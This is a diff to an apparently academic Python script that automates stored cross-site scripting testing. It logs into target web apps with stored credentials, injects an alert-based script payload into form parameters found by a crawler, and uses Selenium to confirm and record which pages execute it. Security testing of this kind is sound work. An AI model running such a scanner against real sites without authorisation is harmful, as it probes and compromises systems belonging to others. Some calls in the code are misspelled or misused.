@@ -12,20 +12,24 @@ import re
 import time
 from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
 
+output_file_path = "confirmed_exploits/"
 blacklist = ("cancel","remove","delete")
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+with open('../webcrawler/webcrawler/setup.json') as setup_file:
+    setup_data = json.load(setup_file)
 
 def check_element_exists(name,driver):
     try:
         inputElement = driver.find_element_by_name(name)
-    except NoSuchELementException:
+    except NoSuchElementException:
         return False
     return inputElement
 
 def check_submit_exists(driver):
     try:
         inputElement = driver.find_element_by_xpath("//input[@type='submit']")
-    except NoSuchELementException:
+    except NoSuchElementException:
         return False
     return inputElement
 
@@ -34,13 +38,13 @@ def check_for_forms(session,r,root,url):
     while checkForm:
         insideForm = False
         submitForm = False
-        newTarget = None 
+        newTarget = None
         formMethod = None
         param = {}
         #check if need to submit form again to store info in db
         for line in r.text.splitlines():
             if "<form" in line.lower():
-                print"found inner form for url " + url + "\n"
+                #print"found inner form for url " + url + "\n"
                 found = re.match(r".*action\s*=\s*\"\s*([^\s\"]*)\s*\"", line, re.IGNORECASE)
                 if found:
                     newTarget = found.group(1)
@@ -53,7 +57,7 @@ def check_for_forms(session,r,root,url):
                 param.clear()
             elif "</form" in line.lower():
                 insideForm = False
-            
+
             if insideForm:
                 if "input" in line.lower() and "submit" in line.lower():
                     if any(s in line.lower() for s in blacklist):
@@ -89,73 +93,95 @@ def check_for_forms(session,r,root,url):
                 r = requets.get(url, params=param, verify=False)
         else:
             checkForm = False
-                
-                
-#Reading the injection points list from the stored.json file
 
-with open('stored.json') as injection_points_file:
-    injection_points = json.load(injection_points_file)
+def GetLoginCredentials(app):
+    login_data = dict()
+    #Reading setup.json to get login_url and credentials
+    for data in setup_data:
+        success = 0
+        if app in data["starting_url"].lower():
+            login_data.update({"login_url":data["logins"][1]["url"]})
+            login_data.update({"username":data["logins"][1]["username"]})
+            login_data.update({"password":data["logins"][1]["password"]})
+            success = 1
+        if(success == 1):
+            break
+    return login_data
+
+input_file_name = "app_0_login_1.json"
+#Reading the injection points list from the stored.json file
+with open('../webcrawler/webcrawler/crawler_output/app_0_login_1.json') as injection_file:
+    injection_points = json.load(injection_file)
+
 
 #Read possible payloads from txt file
-
-#with open('tmp_xss_payloads.txt') as payloads_file:
+#with open('../webcrawler/webcrawler/xss_payloads.txt') as payloads_file:
 #    payloads = payloads_file.read().splitlines();
+
 payloads = ["<script>alert('XSS');</script>"]
 driver = webdriver.Firefox()
 generic_name = "Test"
 attackString = "XSS"
-username = "scanner1"
-password = "scanner1"
 
 #Iterating through injection points, and trying each payload for them
 for tmp in injection_points:
-    url = tmp["action"]
-    print "Currently checking the url " + url + "\n"
-    unamefieldtext = "username"
-    passwdfieldtext = "password"
-    login_url = "https://app1.com/users/login.php"
+    action_url = tmp["action"]
+    current_app = ""
+    found = re.match(r"^https://(.+)\.com/",action_url, re.IGNORECASE)
+    if found:
+        current_app = found.group(1)
+    login_data = GetLoginCredentials(current_app)
+
+    print "Currently checking the url " + action_url + "\n"
+    login_url = login_data["login_url"]
+    username_key = "username"
+    password_key = "password"
+    if (tmp.get("login")):
+        username_key = tmp["login"]["username_key"]
+        password_key = tmp["login"]["password_key"]
+
+    username = login_data["username"]
+    password = login_data["password"]
 
     params = tmp["param"]
     method = tmp["method"]
     reflected_pages = tmp["reflected_pages"]
-    urlComponents = url.split("/")
+    urlComponents = action_url.split("/")
     root = urlComponents[0] + "//" + urlComponents[2]
 
     #start session by loggin in
     session = requests.session()
 
-    login_data = dict()
-    login_data.update({unamefieldtext:username})
-    login_data.update({passwdfieldtext:password})
+    login_params = dict()
+    login_params.update({username_key:username})
+    login_params.update({password_key:password})
 
-    r = session.post(login_url,data=login_data,verify=False)
-    
+    r = session.post(login_url,data=login_params,verify=False)
+
     #Iterate through the all the payloads until something works
     for payload in payloads:
         param_values = dict()
         for param in params:
-            if "name" in param.lower():
-                param_values[param] = generic_name
-            elif "id" in param.lower():
-                param_values[param] = 13
+            if "=" in param.lower():
+                param_components = param.split("=")
+                param_values.update({param_components[0]:param_components[1]})
             else:
-                param_values[param] = payload
-
+                param_values.update({param:payload})
 
         #If get add the payload to url params and then execute url/button click
         if "get" in method.lower():
-            r = requests.get(url, params=param_values, verify=False)
-        
+            r = requests.get(action_url, params=param_values, verify=False)
+
         if "post" in method.lower():
-            r = session.post(url, data=param_values, verify=False)
-        
-        check_for_forms(session,r,root,url)
+            r = session.post(action_url, data=param_values, verify=False)
+
+        #check_for_forms(session,r,root,action_url)
         success_flag = 0
         #open reflected page and see if payload has come successfully through PXSS
         #before opening reflected pages, do a login
         driver.get(login_url)
-        usernameField = check_element_exists(unamefieldtext,driver)
-        passwordField = check_element_exists(passwdfieldtext,driver)
+        usernameField = check_element_exists(username_key,driver)
+        passwordField = check_element_exists(password_key,driver)
         buttonField = check_submit_exists(driver)
 
         if (usernameField and passwordField and buttonField):
@@ -170,9 +196,26 @@ for tmp in injection_points:
                 if EC.alert_is_present():
                     alert = driver.switch_to_alert()
                     if attackString in alert.text:
-                        print "exploit verified in " + driver.current_url
+                        print "Exploit verified in " + driver.current_url
+                        success_flag = 1
                     alert.accept()
                     time.sleep(2)
             except NoAlertPresentException:
-                print "Cleared all alerts on page"
+                success_flag = 0
+            if (success_flag == 1):
+                break
+        #if exploit was successfull write details to a json file
+        if(success_flag == 1):
+            output_file_name = output_file_path + input_file_name
+            out_url = action_url
+            out_reflected_url = reflected_pages
+            out_params = list()
+            for k, v in param_values.iteritems():
+                out_params.append(dict({"key":k,"value":v}))
+            out_method = method
+
+            out_object = dict(url = out_url,reflected_pages = out_reflected_url, method = out_method, params = out_params)
+            with open(output_file_name, 'w') as fp:
+                json.dump(out_object,fp)
+
 driver.quit()
